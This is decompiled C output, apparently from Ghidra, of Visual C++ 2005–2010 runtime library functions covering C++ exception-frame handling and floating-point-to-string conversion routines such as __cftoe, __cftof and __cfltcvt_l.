// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2010 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  undefined4 *puVar1;
  undefined4 *unaff_FS_OFFSET;
  
  puVar1 = (undefined4 *)*unaff_FS_OFFSET;
  RtlUnwind(param_1,(PVOID)0x415bcf,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *puVar1 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = puVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  uint *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,'\0');
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,'\0');
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2010 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  int *unaff_FS_OFFSET;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x415d0c;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_00420044 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = (undefined4 *)*unaff_FS_OFFSET;
    *unaff_FS_OFFSET = (int)&local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 == 0) {
      *unaff_FS_OFFSET = (int)local_2c;
    }
    else {
      *local_2c = *(undefined4 *)*unaff_FS_OFFSET;
      *unaff_FS_OFFSET = (int)local_2c;
    }
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  code *local_8;
  
  ___security_check_cookie_4(*(uint *)(param_2 + 8) ^ (uint)param_2);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(uint **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),'\x01');
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x00415dcf. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2010 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  iVar1 = *(int *)(param_1 + 0x10);
  uVar6 = *(uint *)(param_1 + 0xc);
  uVar2 = uVar6;
  uVar4 = uVar6;
  while (uVar5 = uVar2, -1 < param_2) {
    if (uVar6 == 0xffffffff) {
      _inconsistency();
    }
    uVar6 = uVar6 - 1;
    iVar3 = uVar6 * 0x14 + iVar1;
    if (((*(int *)(iVar3 + 4) < param_3) && (param_3 <= *(int *)(iVar3 + 8))) ||
       (uVar2 = uVar5, uVar6 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar6;
      uVar4 = uVar5;
    }
  }
  uVar6 = uVar6 + 1;
  *param_4 = uVar6;
  *param_5 = uVar4;
  if ((*(uint *)(param_1 + 0xc) < uVar4) || (uVar4 < uVar6)) {
    _inconsistency();
  }
  return (_s_TryBlockMapEntry *)(uVar6 * 0x14 + iVar1);
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2010 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  int **unaff_FS_OFFSET;
  int *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00420044 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  *unaff_FS_OFFSET = local_1c;
  return pvVar1;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2010 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2010 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    FID_conflict__memcpy(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2010 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  char *_Dst;
  int iVar5;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar5 = 0x16;
  }
  else {
    iVar5 = param_2;
    if (param_2 < 1) {
      iVar5 = 0;
    }
    if (iVar5 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      if (0 < param_2) {
        *puVar4 = puVar4[1];
        puVar4 = puVar4 + 1;
        *puVar4 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar4 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,s_e_000_0041e624);
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar5 = param_4[1] + -1;
          if (iVar5 < 0) {
            iVar5 = -iVar5;
            _Dst[1] = '-';
          }
          if (99 < iVar5) {
            iVar3 = iVar5 / 100;
            iVar5 = iVar5 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar5) {
            iVar3 = iVar5 / 10;
            iVar5 = iVar5 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar5;
        }
        if (((DAT_00423828 & 1) != 0) && (_Dst[2] == '0')) {
          FID_conflict__memcpy(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar5 = 0x22;
  }
  *piVar1 = iVar5;
  FUN_0040c664();
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar5;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_00416385:
    *piVar2 = iVar15;
    FUN_0040c664();
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_00416385;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_004166ac;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_0041665b:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_00416666;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_0041665b;
LAB_00416666:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_004166ac:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2010 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  size_t sVar3;
  undefined4 uVar4;
  char *_Str;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    FUN_0040c664();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      *(undefined2 *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this) = 0x30;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      _Str = (char *)((int)this + 1);
      sVar3 = _strlen((char *)this);
      FID_conflict__memcpy(_Str,this,sVar3 + 1);
      *(char *)this = '0';
    }
    else {
      _Str = (char *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      sVar3 = _strlen(_Str);
      FID_conflict__memcpy(_Str + 1,_Str,sVar3 + 1);
      *_Str = ***(char ***)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(_Str + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if (param_2 == (undefined *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else if (param_3 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
  }
  else {
    _SizeInBytes = 0xffffffff;
    if (param_3 != -1) {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2010 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  int iVar4;
  char *pcVar5;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_0040c664();
  }
  else {
    iVar4 = local_30.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_30.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,param_4,&local_30);
    if (eVar3 == 0) {
      local_30.decpt = local_30.decpt + -1;
      if ((local_30.decpt < -4) || ((int)param_4 <= local_30.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_30.sign == 0x2d);
        if (iVar4 < local_30.decpt) {
          do {
            pcVar5 = pcVar1;
            pcVar1 = pcVar5 + 1;
          } while (*pcVar5 != '\0');
          pcVar5[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



